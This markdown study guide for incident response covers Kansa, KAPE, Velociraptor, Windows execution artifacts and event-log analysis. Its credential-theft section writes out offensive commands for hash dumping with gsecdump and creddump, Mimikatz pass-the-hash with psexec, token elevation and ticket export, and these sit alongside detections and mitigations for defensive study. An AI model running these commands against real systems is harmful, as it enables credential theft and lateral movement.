- [Kansa GitHub](https://github.com/davehull/Kansa)

```PowerShell
.\kansa.ps1 -OutputPath .\Output\ -TargetList .\hostlist -TargetCount 250 -Verbose -Pushbin
```

- Modules.conf manages what scripts run
- Omit -TargetList and Kansa will query AD for a list of computers and target all of them
	- Requires [Remote Server Administration Tools](https://www.microsoft.com/en-us/download/details.aspx?id=39296)
- -TargetCount limits the total number of systems queried
- -PushBin required by scripts that employ 3rd party binaries (will first copy binaries to targets before running)
- -Rmbin removes binaries after execution  

**NOTE:** use of third-party tools like `Autorunsc.exe` must include the "**# BINDEP**" (binary dependency) directive inside of the `.Modules\bin` directory to run the `Get-Autorunsc.exe.ps1` module.

**Example Module.conf:**

- "# BINDEP .\Modules\bin\Autorunsc.exe"

**Analysis**
- Can pre-filter and organize data
- Located in the .\Analysis folder
- Uses "stacking" (Least Frequency of Occurence)
- "Meta" scripts loook at indicators like file size
- Example
	- LogParser (LogparserStack.ps1) to stack unsigned Autoruns output from multiple Kansa output files
	- [Computer Forensics How-To: Microsoft Log Parser](https://www.sans.org/blog/computer-forensics-how-to-microsoft-log-parser/)  

**Distributed Kansa**
- Kansa has issues scaling to 1000+ systems
- Fixed with .\DistributedKansa.ps1
- Scripts included to set up distrubted Kansa-Servers
- Modules collect and send data asynchronously to ELK
- [Kansa for Enterprise scale Threat Hunting w/ Jon Ketchum](https://www.youtube.com/watch?v=ZyTbqpc7H-M)
- [Kansa for Enterprise Scale Threat Hunting](https://www.sans.org/presentations/kansa-for-enterprise-scale-threat-hunting/)

**Enable PowerShell Remoting**
- Remoting requires that all network connections be set to something other than "Public." 

1. User ```Get-NetConnectionProfile``` to check
2. If necessary, change it to Private with ```Set-NetConnectionProfile```
```powershell
Set-NetConnectionProfile -InterfaceIndex XX -NetworkCategory Private
```
1. Enable PowerShell Remoting with ```Enable-PSRemoting -force```
2. Run Kansa
```powershell
.\kansa.ps1 -Pushbin -Target computername -Credential SANSDFIR -Authentication Negotiate
```



## Kansa Data Stacking Collection and Analysis

### Stacking Autoruns

1. Run ```Get-ASEPImagePathLaunchStringStack.ps1``` against autoruns data from workstations and output to csv
```powershell
.\Get-ASEPImagePathLaunchStringMD5UnsignedStack.ps1 >asep-workstation-stack.csv
```

2. Note entries with the least amount of occurences and the associated workstations
```powershell
Select-String "process name" *Autorunsc.csv
```



### Stacking Services

1. Use ```Get-LogparserStack.ps1``` to perform frequency analysis on services
```powershell
.\Get-LogparserStack.ps1 -FilePattern *SvcAll.csv -Delimiter "," -Direction asc -OutFile SvcAll-workstation-stack.csv
```

2. Script lists names of headers in the CSV files and prompts for which field to count matching values across all files and then which fields to group by (list) in the output.
	- Enter "Name"
	- Name
	- DisplayName
	- PathName
	- Enter "quit" to quit

3. Open the csv output and note entries with the least amount of occurences and the associated workstations
```powershell
Select-String "tbbd05" *SvcAll.csv 
```


### Stacking WMI Filters and Consumers

1. Use ```Get-LogparserStack.ps1``` to perform frequency analysis on WMI Filters
```powershell
.\Get-LogparserStack.ps1 -FilePattern *WMIEvtFilter.csv -Delimiter "," -Direction asc -OutFile WMIEvtFilter-workstation-stack.csv
```

2. Script lists names of headers in the CSV files and prompts for which field to count matching values across all files and then which fields to group by (list) in the output.
	- Enter "Name"
	- Name
	- Query
	- Enter "quit" to quit

3. Open the csv output and note entries with the least amount of occurences and the associated workstations
```powershell
Select-String "PerformanceMonitor" *WMIEvtFilter.csv
```

4. Search the Kansa WMI Binding output data
```powershell
Select-String "PerformanceMonitor" *ConBind.csv
```

5. Search the Kansa WMI Event Consumer output data
```powershell
Select-String "SystemPerformanceMonitor" *WMIEvtConsumer.csv
```

---

## KAPE
[Kroll Artifact Parser and Extractor (KAPE)](https://ericzimmerman.github.io/KapeDocs/#!index.md)   
  - Is the de facto triage collection tool for incident response scenarios!

  - Triage program that will target a device or storage location, find the most forensically relevant artifacts (based on your needs), and parse them within a few minutes. KAPE allows investigators to find and **prioritize the more critical systems to their case**. KAPE can be **used to collect the most critical artifacts prior to the start of the imaging process**. While the imaging completes, the data generated by KAPE can be reviewed for leads, building timelines, etc.
  
[KAPE Targets](https://github.com/EricZimmerman/KapeFiles/tree/master)  
- Provides a list of customized KAPE targets that are pre-cooked and ready for remote collection. 

Sample KAPE Command

```
kape.exe --tsource [DRIVE_LETTER] --target [ARTIFACT_TARGETS] --tdest C:\PATH\TO\OUTPUT
```
- `--tsource`: driver letter to directory search formateed as C, D:, or F:\
- `--target`: target config to run without the extension. Get a list of all available targets with `--tlist`
- `--tdest`: directory where files should be copied to The directory will be created if it doesn't exist.
- `tvss`: Find, mount, and search all availabe Volume or Shadow Copies on `--tsource`.
- `vhdx` and `vhd`: Creates a VHDX virtual hard drive from the contents of `--tdest`
- `debug`: When true, enables debug messages.

---

## Velociraptor

**NOTE:** Essentially, an advanced digital forensic and incident response tool that enhances your visibility into your endpoints for specific host analysis of a specific segment of your network.

* [Velociraptor](https://github.com/Velocidex/velociraptor)

* [Velociraptor Docs](https://docs.velociraptor.app/)

* [Velociraptor Training](https://docs.velociraptor.app/training/)  

* [Scaling Velociraptor](https://docs.velociraptor.app/blog/2021/2021-04-29-scaling-velociraptor-57acc4df76ed/)

* [Velociraptor Artifacts](https://docs.velociraptor.app/exchange/)  
  * Used to search for custom VQL queries that can be further customized for your own analyst needs!

### Most Common VQL Data Tranformations
| Data Operation | VQL Operator | Example VQL |
|---|---|---|
| View specific columns | `SELECT <column> FROM` | `SELECT Exe, Hash FROM source()` |
| Expose nested JSON field | `<column>.<nested field name>` | `SELECT Exe, Hash.MD5 FROM source()` |
| Filter for keyword | `WHERE <column> =~ 'keyword'` | `WHERE Exe =~ 'mimikatz'` |
| Negate filter for keyword | `WHERE NOT <column> =~ 'keyword'` | `WHERE NOT Exe =~ 'svchost'` |
| Join multiple filters | Use Boolean AND/OR | `WHERE NOT Exe =~ 'svchost' AND NOT Exe =~ 'edge'` |
| Group like values | `GROUP BY <column>` | `GROUP BY Hash.MD5` |
| Count occurrences | `count() AS <new column name>` | `SELECT Exe, Hash.MD5, count() AS Count FROM source()` |
| Sort alphanumerically | `ORDER BY <column> <DESC>` | `ORDER BY Count (default order is ASCENDING)` |

### Essential Velociraptor Built-in Artifacts

| Filesystem Timeline | Memory Acquisition | Autoruns |
|---|---|---|
| Windows Timeline | Processes, DLLs | Permanent WMI Events |
| Prefetch Timeline | VAD, Handles, Mutants | Scheduled Tasks |
| KAPE Triage | Impersonation Tokens | Service Creations |
| Volume Shadow Copy | Netstat, ARP | Certificate Store |
| MFT, $130 | DNS Queries | SRUM, BAM |
| File Finder | Event Logs | ShimCache, AmCache |
| YARA Scanning | User ProfileList | UserAssist |

---

## Credential Theft Detection and Response

**NOTE:** the reason why attackers aim for the DC to dump hashes is because tools are only able to dump the hashes of active sessions. The DC is able to maintain multiple sessions at one time thus providing an attacker with the maximum amount of impact

**NOTE II:** The most immediate objective for an attacker is to secure the credentials to as many systems as possible whenever they first access a user/system. Without proper credentials, the attacker is UNABLE to laterally move through any portion of the network.

### Detecting Credential Harvesting
- Event Logs
	- 4624 Logons
	- 4720 Account Creation
	- 4776 Local Account Auth
	- 4672 Privileged Account Usage
- Unix "secure"logs
- Auditing New Accounts
- Anomalous Logins
	- Workstation to Workstation
	- Sensitive Networks
- After Hour Logins

**Mitigations (Win10)**
- Credential Guard: Moves credentials (hashes & ticket) into virtual enclave
- Remote Credential Guard: RDP without pushing credentials to remote target
- Device Guard (Prevent execution of untrusted code)

**Hunt Notes**
- WDigest Plaintext Credentials
	- HKLM\System\CurrentControlSet\Control\SecurityProviders\WDigest
		- UseLogonCredential = "1" (Should be 0)

---

### Hashes

- Availabe in the LSASS process
- Can be extracted with admin privileges
- Local account password hashes are available in the SAM hive in memory or on disk
- Domain account hashes are present in memory during interactive sessions

#### Common Tools
* Mimikatz
* fgdump
* gsecdump
* Metasploit
* AceHash
* PWDumpX
* creddump
* WCE (Windows Credential Editor)

**Pash-the-Hash Attack**
- Authenticate using a stolen account hash without knowing the cleartext password
	- Tools: Metasploit PsExec module, WCE, and SMBshell
- Limited to NTLM authentication
- Often used to map shares, perform PsExec-style remote execution, and WMI
- [Protecting Privileged Domain Accounts: Safeguarding Password Hashes](https://www.sans.org/blog/protecting-privileged-domain-accounts-safeguarding-password-hashes/)
- [Slides on Mimikatz 2.0](https://lira.epac.to/DOCS-TECH/Hacking/Mimikatz/Benjamin%20Delpy%20-%20Mimikatz%20a%20short%20journey%20inside%20the%20memory%20of%20the%20Windows%20Security%20service.pdf)
- [Mitigating Pass-the-Hash (PtH) Attacks and Other Credential Theft, Version 1 and 2](https://www.microsoft.com/en-us/download/details.aspx?id=36036)

**Examples**
- Hash dump with Gsecdump
```
gsecdump.exe -a > 1.txt
```

- Pass the Hash (Mimikatz)
```
mimikatz # sekurlsa::pth /user:username /domain:computername /ntlm:hash /run:".\psexec.exe -accepteula \\10.10.10.10 cmd.exe"
```

### Protecting Hashes

- Prevent admin account compromise
- Stop remote interactive sessions with highly privileged accounts
- Proper termination of RDP sessions
- Win 8.1+: force the use of Restricted Admin?
- Win 10+: deploy Remote Credential Guard
- Upgrade to Windows 10+
- Credential Guard
- TsPkg, WDigest, etc.: SSO creds obsolescence
- Domain Protected Users Group (PtH mitigation)

#### Credential Availability Based on Admin Action

| Admin Action | Logon Type | Credentials on Target? | Notes |
|---|---|---|---|
| Console logon | 2 | Yes* | *Except when Credential Guard is enabled |
| RunAs | 2 | Yes* | *Except when Credential Guard is enabled |
| Remote Desktop | 10 | Yes* | *Except for enabled Remote Credential Guard |
| Net Use | 3 | No | Including /u: parameter |
| PowerShell Remoting | 3 | No | Invoke-Command; Enter-PSSession |
| PsExec alternate creds | 3+2 | Yes | `-u <username> -p <password>` |
| PsExec w/o explicit creds | 3 | No |  |
| Remote Scheduled Task | 4 | Yes | Password saved as LSA Secret |
| Run as a Service | 5 | Yes | (w/ user account) - Password saved as LSA Secret |
| Remote Registry | 3 | No |  |

---

### Tokens

**NOTE:** **delegate tokens** enable domain admins to complete “double hops” essentially accessing a remote workstation, map a Share Drive from their host machine to the remote machine to pull and update patches. That connection copies their delegate token to that remote machine making the remote machine vulnerable to token stealing.

- Targets user sessions and running services
- Used for SSO
- Attacker can impersonate user's security context
- `SeImpersonate` privileges let tokens be copied from processes (also SYTEM or admin)
- Can allow adding user or managing group membership, mapping of remote shares, or Running PsExec (delegate tokens only)
- Often used to escalate from local to domain admin

#### Token Stealing (Mimikatz)
- Assumes attacker has local admin
```
mimikatz # privilege::debug
mimikatz # token:whoami
mimikatz # token:elevate /domain admin (identifies any domain admins present on the system)
```

#### Common Tools
- Incognito
- Metasploit
- PowerShell (PowerShell Empire)
- Mimikatz

**Hunting**
- [Monitoring for Delegation Token Theft](https://www.sans.org/blog/monitoring-for-delegation-token-theft/)

### Protecting Tokens
- Prevent admin account compromise
- Stop remote interactive sessions with highly privileged accounts
- Proper termination of RDP sessions
- Win 8.1+: force the use of Restricted Admin Mode?
- Win 10+: deploy Remote Credential Guard
- Account designation of “Account is Sensitive and Cannot be Delegated” in Active Directory
- Domain Protected Users security group accounts do not create delegate tokens

---

### Cached Credentials
- Stored domain credentials to allow logons when off domain
- Cached credentials hashes have to be cracked
- Salted and case-sensitive (slow to crack)
- Cannot be used in pass the hash
- Stored in the SECURITY\Cache registry key
- Admin or SYSTEM privileges required
- Hashes cracked with John the Ripper or hashcat

#### Common Tools
- cachedump
- Metasploit
- PWDumpX
- creddump
- AceHash

**Cached Credential Extraction with Creddump**

```./pwdump.py SYSTEM SAM true``` <- Local NT Hashes  
```./cachedump.py SYSTEM SECURITY true``` <- Cached Hashes

### Protecting Cached Credentials
* Prevent admin account compromise
* Limit number of cached logon accounts
  * SOFTWARE\Microsoft\Windows NT\Current Version\Winlogon (cachedlogonscount value)
  * A cachedlogonscount of zero or one is not always the right answer
* Enforce password length and complexity rules
  * Brute force cracking is required for this attack
* Domain Protected Users security group accounts do not cache credentials

---

### LSA Secrets

* Used to allow services or tasks to be run without user interaction.
* Stored in the Security hive registry key `SECURITY/Policy/Secrets`. Each secret has its own key, and a parent key within `SECURITY/Policy` that can decode the secret.

### Decrypt LSA Secrets with Nishang
- Requires Admin
- Gain permissions necessary to access the Security registry hive with ```Enable-DuplicateToken```
- Dump registry data with ```Get-LsaSecret.ps1```  

#### Common Tools
- Cain
- Metasploit
- Mimikatz
- gsecdump
- AceHash
- creddump
- PowerShell

### Protecting LSA Secrets
* Prevent admin account compromise
* Do not employ services or schedule tasks requiring privileged accounts on low-trust systems
* Reduce number of services that require domain accounts to execute
  * Heavily audit any accounts that must be used
* (Group) Managed Service AccountsDefending Credentials

---

### Tickets - Kerberos
- Kerberos issues tickets to authenticated users
- Cached in memory and valid for 10 hours
- Tickets can be stolen from memory and used to authenticate else where (Pass the Ticket)
- Access to the DC allows tickets to be created for any user with no expiration (Golden Ticket)
- Service account tickets can be requested an forged, including offline cracking of service account hashes (Kerberoasting)

#### Common Tools
* [Kerberoast](https://github.com/nidem/kerberoast)
* Mimikatz
* Windows Credential Editor (WCE)

### Pass the Ticket with Mimikatz
- Dump Tickets
```mimikatz # sekurlsa::tickets /export```
- Import ticket elsewhere
```mimikatz # keberos::ptt [ticket]```
- Now available to authenticate to throughout environment

### Kerberos Attacks

| Attack | Description |
|---|---|
| Pass the Ticket | Steal ticket from memory and pass or import on other systems |
| Overpass the Hash | Use NT hash to request a service ticket for the same account |
| Kerberoasting | Request service ticket for highly privileged service and crack NT hash |
| Golden Ticket | Kerberos TGT for any account with no expiration. Survives full password reset |
| Silver Ticket | All-access pass for a single service or computer |
| Skeleton Key | Patch LSASS on domain controller to add backdoor password that works for any domain account |
| DCSync | Use fake Domain Controller replication to retrieve hashes (and hash history) for any account without login to the DC |

### Protecting Tickets

* Credential Guard (Win10+)
  * Domain Protected Users Group (Win8+): Some attacks
* Remote Credential Guard (Win10+)
  * Restricted Admin (Win8+)
* Long and complex passwords on service accounts
  * Change service account passwords regularly
  * Group Managed Service Accounts are a great mitigation
* Audit service accounts for unusual activity
* Limit and protect Domain Admin
  * Change KRBTGT password regularly (yearly)


| Attack Type | Description | Mitigation |
|---|---|---|
| Pass the Ticket | Steal ticket from memory and pass or import on other systems | Credential Guard; Remote Credential Guard |
| Overpass the Hash | Use NT hash to request a service ticket for the same account | Credential Guard; Protected Users Group; disable RC4 authentication |
| Kerberoasting | Request service ticket for highly privileged service and crack NT hash | Long and complex service account passwords; Managed Service Accounts |
| Golden Ticket | Kerberos TGT for any account with no expiration. Survives full password reset | Protect domain admin accounts; change KRBTGT password regularly |
| Silver Ticket | All-access pass for a single service or computer | Regular computer account password updates |
| Skeleton Key | Patch LSASS on domain controller to add backdoor password to any account | Protect domain admin accounts; smart card usage for privileged accounts |
| DCSync | Use false DC replication to obtain hashes | Protect domain admin; audit/limit accounts with replication rights |

* [PROTECTING WINDOWS NETWORKS – KERBEROS ATTACKS](https://dfirblog.wordpress.com/2015/12/13/protecting-windows-networks-kerberos-attacks/)

---

### NTDS.DIT
- Active Directory Domain Services (AD DS) database holds all user and computer account hashes (LM/NT) in the domain
- Encrypted but algorithm is easy to decrypt
- Located in the \Windows\NTDS folder on Domain Controller
- Requires admin accessto load driver to access raw disk or use Volume Shadow Copy Service

### AD Enumeration

#### Bloodhound - Find a Path to Domain Admin
- Active Directory relationship graphing tool
	- Nodes: Users, Computers, Groups, OUs, GPOs
	- Edges: MemberOf, HasSession, AdminTo, TrustedBy
	- Paths: A list of nodes connected by edges (Path to Domain Admin)
	- Visualizes dangerous trust relationships and misconfigurations
	- Reduces brute-force effort required
	- Difficult to detect (Uses prodominantly LDAP)
		- Uses cached LDAP connections

#### Common Tools

* [secretsdump.py](https://github.com/fortra/impacket/blob/master/examples/secretsdump.py)  
  * Extracting contents from ntds.dit AD database file

* [Bloodhound](https://github.com/BloodHoundAD/BloodHound)

<img alt="BloodHound" src="https://i0.wp.com/wald0.com/wp-content/uploads/2017/05/TransitiveControllers.png?ssl=1" />  

* [GoFetch](https://github.com/GoFetchAD/GoFetch) – tool used to automatically map an attack path utilizing Bloodhound’s AD enumeration graph  

* [DeathStar](https://github.com/byt3bl33d3r/DeathStar) – Python script that uses Empire's RESTful API to automate gaining Domain and/or Enterprise Admin rights in Active Directory environments using some of the most common offensive TTPs.  

* [Empire](https://github.com/BC-SECURITY/Empire) –  post-exploitation and adversary emulation framework that is used to aid Red Teams and Penetration Testers.  
    * [Automating the Empire with the Death Star: getting Domain Admin with a push of a button](https://byt3bl33d3r.github.io/automating-the-empire-with-the-death-star-getting-domain-admin-with-a-push-of-a-button.html)
    * Uses PowerShell Empire to enumerate accounts, perform cred theft, and lateral movement

* [PowerSploit](https://github.com/PowerShellMafia/PowerSploit) – a collection of Microsoft PowerShell modules that can be used to aid penetration testers during all phases of an assessment. PowerSploit is comprised of the following modules and script


### Protecting Against AD Enumeration
* `BloodHound` is very stealthy in most environments. It uses LDAP requests within the enterprise to enumerate permissions making detection very difficult.
* Use of netflow logs (tracking LDAP session)
* Auditing Directory Service Access in AD logs
* Using honey tokens
* Use of EDR to detect named pipes or other heuristics
* Inappropriate use of credentials after the theft occurs (**NOT IDEAL**)

---

# (2) Intrusion Analysis

## Evidence of Execution

### Prefetch
- Evidence of execution
	- Executable name, execution time(s), and execution count
- Limitations: Off by default on servers or workstations with SSDs
- .pf filename (compressed)
	- executable file name followed by dash and hexidecimal representation of a hash of the file's path
- Multiple .pf files with the same executable name can be indicative of two executables with the same name being run from different locations
	- Execeptions: hosting applications (svchost, dllhost, backgroundtaskhost, and rundll32) hash values calculated based off of commandline arguments

**Notes**
- First execution (creation date -10 seconds)
- Last execution (modified date -10 seconds)

**Usage**
- Can be analyzed with PECmd.exe ```PECmd.exe -d "C:\Windows\Prefetch" --csv "G:\cases" -q```  
- [PECmd](https://github.com/EricZimmerman/PECmd)

```
PECmd.exe -d "<dir of PF files>" --csv "<dir>" -q
```

**Options:**

* **-d "[dir of PF files]":** Dir to recursively process
* **-f "<filename>":** File to process
* **-q:** Quiet Output; use w/ --CSV
* **-k:** Comma Separated Keywords
* **--csv "[dir]":** Dir to save CSV (tab separated)
* **--csvf name:** Filename to save CSV
* **--html "[dir]":** Dir to save html

### ShimCache - Application Compatibility
- Available on workstations AND Servers
- Not as easy to delete as Prefetch
- Designed to detect and remediate
- Different compatibility modes are called shims
- Tracks Name, File Path, and Last Modification Time of executable
- Executables can be added to the regirsty regradless if they've been executed
	- Executable viewed via Windows GUI apps
- After XP, ShimCache no longer include execution time
- Win7 & 8/8.1 include execution flags (Win 10 does not)
	- InsertFlag = True (App Executed)

**Win 7+**  

```
SYSTEM\CurrentControlSet\Control\SessionManager\AppCompatCache\AppCompatCache
```  

- Server 2003 = 512 Entries
- Win7-10, Server 2008-2019 = 1024 Entries

**Win XP**

```
SYSTEM\CurrentControlSet\Control\SessionManager\AppCompatibility\AppCompatCache
```  

- 96 entries

**Notes**
- Most recent activities are on the top
- New entries are only written on shutdown (only exist in memory before)
- Each "ControlSet" can have its own ShimCache database
- If the executable is modified (content changes) or renamed, it will be shimmed again
- [Leveraging the Application Compatibility Cache in Forensic Investigations](https://web.archive.org/web/20190209113245/https://www.fireeye.com/content/dam/fireeye-www/services/freeware/shimcache-whitepaper.pdf)

**Analysis**
- [AppCompatCacheParser](https://github.com/EricZimmerman/AppCompatCacheParser)

```
.\AppCompactCacheParser.exe -f .\SYSTEM --csv c:\temp
```
- Written in order of excecution or GUI discovery
- Additional tool from Mandiant: [ShimCacheParser](https://github.com/mandiant/ShimCacheParser)



### Amcache.hve - Application Compatibility
```
C:\Windows\AppCompat\Programs\Amcache.hve
```
- Win7+
- Tracks installed applications, loaded drivers, and unassociated excectuables
- Full path, file size, file modification time, compilation time, publisher metadata
- SHA1 hashes of executables and drivers
- Entries can be due to file discovery or installation and not always execution
- [ANALYSIS OF THE AMCACHE](https://www.ssi.gouv.fr/uploads/2019/01/anssi-coriin_2019-analysis_amcache.pdf)

**Analysis**
- InventoryApplicationFile
	- FileId: SHA1 Hash
	- LinkDate: PE Header Compilation Time
	- LowerCaseLongPath: Full Path
	- ProgramId: Cross-Ref with InventoryApplication key for more info
		- Unassociated (not installed) applications dont have a ProgramId
		- Malware often does not go through the installation process
	- Size: File Size
- InventoryApplication
	- Installed Application
	- Provides Installation Date
	- Publisher information
- InventoryDriverBinary
	- Keys contain file path of driver
	- DriverId: SHA1 Hash
	- DriverLastWriteTime: Modification Time of Driver
	- DriverSigned: 1 = signed
	- Product/ProductVersion = Driver Metadata
	- Rootkits are often heavily reliant on drivers
	- Most drivers in ```C:\Windows\system32\drivers\```

- Can be parsed with [AmCacheParser](https://github.com/EricZimmerman/AmcacheParser)
```
amcacheparser.exe -i -f amcache.hve --csv G:\<folder>
```
- Leverages allowlisting and blocklisting based on SHA1



### Automating and Scaling Execution Analysis
- Malware 101
	- One/two letter executables
	- Executions from temp ro $Recycle.Bin folders
- Common Tools
	- psexec.exe
	- wmic.exe
	- scrcons.exe
	- certutil.exe
	- rar.exe
	- wsmprovhost.exe
	- whoami.exe
	- schtasks.exe
- IOCs
	- Known Malware
	- Tools
	- Staging directories

**[appcompatprocessor.py](https://github.com/mbevilacqua/appcompatprocessor)**
- Performs scalable hunting of ShimCache and Amcache artifacts
- Regex Searches + built library of common anomalies
- "Reconscan" to search for grouping of known recon tools
- [ShimCache and AmCache Enterprise-wide Hunting](https://github.com/mbevilacqua/appcompatprocessor)
- Temporal correlations of execution activity

Perform a search against built-in signatures
```
AppCompatProcessor.py database.db search
```

Perform least frequency of occurence analysis
```
AppCompatProcessor.py database.db stack "FilePath" "FileName" LIKE '%svchost.exe'"
```



## Event Logs Analysis



### Event Log Summary

| **Activity** | **Event Log** | **EID** |
| :---------------: | :---------------: | :---------------: |
|Logons|Security|4624, 4625, 4634, 4647,  4648, 4769, 4771, 4776|
|Account Logon|Security|4678, 4769, 4771, 4776|
|RDP|Security  RDPCoreTS  Terminal Services-RemoteConnectionManager|4624, 4625, 4778, 4779  131  1149|
|Network Shares|Security|5140-5145|
|Scheduled Tasks|Security  Task Scheduler|4698  106, 140-141, 200-201|
|Installation|Application|1033, 1034, 11707, 11708, 11724|
|Services|System  Security|7034-7036, 7040, 7045  4697|
|Log Clearing|Security  System|1102  104|
|Malware Execution|Security  System  Application|4688  1001  1000-1002|
|CommandLines|Security  PowerShell-Operational|4688  4103-4104|
|WMI|WMI-Activity-Operational|5857-5861|



### Event Log Collection
**Live System Collection**
- Export from Event Viewer
- PsLogList (Sysinternals)
- Kape, Kansa, Velociraptor
- PowerShell

**PowerShell**
- Remote: ```Get-WinEvent -ComputerName```  
- Local: ```Get-WinEvent -Logname```
- Archived: ```Get-WinEvent -Path```

**Example**
```powershell
Get-WinEvent -FilterHashtable
@{Logname="Security"; id=4624} | where
{$_.Message -match "w00d33"}
```



```powershell
Get-WinEvent -FilterHashtable
@{Path="C:\Path-To-Exported\Security*.evtx"
;id=5140} | Where {$_.Message -match "\\Admin\$"}
```



### Location
- Server 2003 and older
	- %systemroot%\System32\config
	- .evt
- Vista and newer
	- %systemroot%\System32\winevt\logs
	- .evtx



### Types

**Security**
- Records access control and security settings
- Events based on audit and group policies
- Example: Failed logon; folder access
- User authentication
- User behavior and actions
- File/Folder/Share access

**System**
- Contains events related to Windows services, system components, drivers, resources, etc.
- Example: Service stopped; system rebooted

**Application**
- Software events unrealted to operating system
- Example: SQL server fails to access database

**Other**
- Task Scheduler
- Terminal Services
- Powershell
- WMI
- Firewall
- DNS (Servers)



### Profiling Account Usage
- Determine which accounts have been used for attempted logons
- Track account usage for known compromised accounts

**Event IDs**
- 4624: Successful Logon
- 4625: Failed Logon
- 4634/4647: Successful Logoff
- 4648: Logon using explicit credentials (RunAs)
- 4672: Account logon with superuser rights (Administrator)
- 4720/4726: An account was created/deleted

**Notes**
- Windows does not reliably record logoffs, also look for 4647 -> user initiated logoff for interactive logons
- Logon events are not recorded when backdoors, remote exploits, or similar malicous means are used to access a system

**Logon Types**  
2: Logon via console (keyboard, server KVM, or virtual client)  
3: Network logon (SMB and some RDP connections)  
4: Batch Logon -- Often used by Scheduled tasks  
5: Windows Service Logon  
7: Credentials used to lock or unlock screen; RDP session reconnect  
8: Network logon sending credentials in cleartext  
9: Different credentials used than logged on user -- RunAs/netonly  
10: Remote interactive login (Remote Desktop Protocol)  
11: Cached credentials used to log on  
12: Cached Remote Interactive (similar to Type 10)  
13: Cached unlock (similar to Type 7)  
Ref: [Logon Type Codes Revealed](https://techgenix.com/Logon-Types/)

**Identify Logon Sessions**
- Use Logon ID value to link a logon with a logoff and determine session length
- Useful for interactive logons (Type 2, 10, 11, 12)
- Can tie togther actions like special user privileges assigned to the session, process tracking, and object access
- Admin logins generate two different sessions
	- high privilege session
	- lower privlege session



### Brute Force Password Attack
- Logon Type 3 - Could SMB or RDP
- 1 accounts and many passwords = password guessing attack
- many accounts and few passwords = password spraying attack
- [Failed Login Codes](https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4625)



### Built-In Accounts

- SYSTEM
	- Most powerful local account; unlimited access to system

- LOCAL SERVICE
	- Limited privileges similar to authenticated user account; can access only network resources via null session

- NETWORK SERVICE
	- Slightly higher privileges that LOCAL SERVICE; can access network resouces similar to authenticated user account

- HOSTNAME$
	- Every domain-joined windows system has a computer account

- DWM
	- Desktop window manager\Window manager group

- UMFD
	- Font driver host account

- ANONYMOUS LOGON
	- Null session w/o credentials use to authenticate with resource

**Notes**  
- Recommended to ignore in initial investigation (very noisy)



### Tracking Administrator Account Activity

- Event ID 4672
- Usually follows Event ID 4624 (Successful Logon)
- Important for:
	- Account auditing
	- Planning for password resets
	- Identifying compromised service accounts
- Scheduled tasks run with administrative privileges also trigger this



### Auditing Account Creation

- Event ID 4720
- Complementary events include
	- 4722: A user account was enabled
	- 4724: An attempt was made to reset an accounts password
	- 4728: A member was added to a security enabled global group
	- 4732: A member was added to a security enabled local group
	- 4735: A security enabled local group was changed
	- 4738: A user account was changed
	- 4756: A member was added to a security enabled universal group



### Remote Desktop Activity

- Event ID 4778 (Session Reconnected)
	- Should see 4624 (Successful logon) simultaneously
	- Session name contains "RDP"
	- Client Name: True Client Hostname (regardless of hops)
- Event ID 4779 (Session Disconnected)
	- Should see 4647 (Successful logoff) simultaneously
- Not a reliable indicator of all RDP activity (records reconnects)
	- Fill in gaps with Event ID 4624 Type 3,7,10 Events
- Logs provide IP address and hostname
- False positive: Shared workstations (fast user switching)
	- Session Name: Console
- Source System
	- Security
		- 4648: Logon with alternate credentials
			- Current logged on username
			- Alternate user name
			- Destination hostname/ip
			- Process Name
	- TerminalServices-RdpClient
		- 1024
			- Destination hostname
		- 1102
			- Destination IP
- Destination System
	- Security
		- 4624 Type 10
			- Source IP/Logon Username
		4778/4779
			- IP address of source/source system name
			- Logon Username
	- Remote Desktop Services-RDPCoreTS
		- 131 - Connection attempts
			- Source ip/logon username
		- 98 - Successful connections
	- TerminalServices Remote Connection Manager
		- 1149
			- Source ip/logon user name
				- Blank may indicate use of sticky keys
	- Terminal Services LocalSession Manager
		- 21,22,25
			- Source IP, Logon username
		- 41
			- Logon Username
- 4624 Type 7
	- Often Unlock or RDP Reconnect



### Account Logon Events

- Different than logon events
- Recorded on system that authenticated credentials
	- Local Account/Workgroup = on workstation
	- Domain/Active Directory = on domain controller  

- Event ID codes (NTLM)
	- 4776: Successful/Failed account authentication  

- Event ID codes (Kerberos protocol)
	- 4768: TGT was granted (successful logon)
	- 4769: Service Ticket was requested (access to server resource)
	- 4771: Pre-authentication failed (failed logon)

- Anomaly: find places where authentication didnt happen on domain controller (local account)  

**Error Codes**
- 4771 - 4776/4625
	- 0x6 - 0xC0000064: Invalid Username
	- 0x7 - n/a: Requested server not found
	- 0xC - 0xC0000070: Logon from unauthorzed workstation
	- 0x12 - 0xC0000234: Account locked, disabled, or expired
	- 0x17 - 0xC0000071: Password expired
	- 0x18 - 0xC000006A: Password invalid
	- 0x25 - n/a: Clock skew between machines is too great



### Privileged Local Account Abuse - Pass the Hash

- Filter event logs for Event ID 4776 (exclude Domain Controllers)
- Identify any workstations with these events
- Note Source Workstation, if Source Workstation doesn't match source of log activity is taking place remotely
- Review events surrounding 4776
	- 4624 (succesful logon)
		- Type 3 often indicative of share mapping or exceuting code with PsExec
	- 4672 - Privelged logon
	- 5140 - File Share event



### Account and Group Enumeration

- Event ID 4798: A user's local group was enumerated
- Event ID 4799: A security-enabled local group membership was enumerated

**Notes**

- New events starting with Win10 and Server 2016
- Focus on the process being used
	- PowerShell
	- WMIC
	- Cmd
- Filter on sensitive groups, unusual accounts, and process information
- Allowlist common processes
	- mmc.exe
	- services.exe
	- taskhostw.exe
	- explorer.exe
	- VSSSVC.exe

**Common Attack Tools**

- PowerView (PowerSploit)
- PowerShell Empire
- DeathStar

**Log Attributes**

- Account Name: Account that performed enumeration
- Group Name: Group Enumerated
- Process Name: Process used for enumeration



### Event Log Analysis Tools

- [Event Log Explorer](https://eventlogxp.com/)
	- Color Codes by Event IDs
	- Open many logs simultaneously
	- Filtering
	- Log merging (aids correlation and search time)

- [EvtxEcmd](https://github.com/EricZimmerman/evtx)
	- Xpath filters
	- Output to CSV, XML, JSON
	- Extraction of "custom" fields
	- Log merging and normalization
	- Crowd-sourced event maps
	- Noise reduction
	- Extract from VSS and de-duplicate



### Lateral Movement - Network Shares

- Event Id 5140: Network share was accessed
- Event Id 5145: Share object accessed (detailed file share auditing)

**Notes**

- Log provides share name and IP address of remote machine making connection
- Account name and logon ID allow tracking of relevant account and other activities
- Requires object access auditing to be enabled
- Event IDs 5142-5144 track share creation, modification, and deletion
- Detailed file share auditing (5145) provides detail on individual files access (can be very noisy)



### Cobalt Strike Mapping Shares

